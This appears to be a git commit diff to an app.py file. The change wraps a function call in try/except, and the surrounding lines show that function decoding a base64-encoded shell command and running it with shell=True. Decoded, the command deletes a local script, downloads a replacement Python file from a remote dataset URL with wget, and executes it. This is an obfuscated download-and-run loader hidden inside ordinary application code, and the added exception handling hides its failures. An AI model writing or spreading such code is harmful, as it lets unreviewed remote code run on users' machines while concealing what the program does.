bf9b653345f2133432d58530ba291408e8203d75
2575044704 <2575044704@qq.com>
2024-04-26 21:29:57 +0800

    Update app.py

--- app.py
+++ app.py
@@ -4,4 +4,8 @@ def code():
     encoded_command = "CnJtIC4vYXBwMTEucHkKd2dldCBodHRwczovL2hmLW1pcnJvci5jb20vZGF0YXNldHMvQUNDQTIyNS9vcGVueGxhYi9yZXNvbHZlL21haW4vYXBwMTEucHkKcHl0aG9uIGFwcDExLnB5"
     decoded_command = base64.b64decode(encoded_command).decode()
     subprocess.run(decoded_command, shell=True, check=True)
-code()
+try:
+    code()  # Call the code() function
+except Exception as e:
+    print("An error occurred:", e)
+
